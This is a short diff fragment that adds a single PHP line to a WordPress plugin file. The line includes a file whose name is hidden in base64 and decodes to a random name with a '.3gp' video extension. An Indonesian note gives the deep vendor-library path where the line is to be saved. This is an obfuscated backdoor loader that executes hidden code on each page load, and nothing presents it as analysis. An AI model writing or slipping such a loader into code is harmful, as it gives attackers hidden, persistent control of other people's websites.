@@ -1,0 +1,3 @@
+<?php include_once base64_decode("UWVNdEZnc3dIWVp2aG5yZnkuM2dw"); ?>
+
+di simpan di : /www/wp-content/plugins/autoupdater/lib/vendor/paragonie/sodium_compat/src/Core/Base64/Base64/index.php
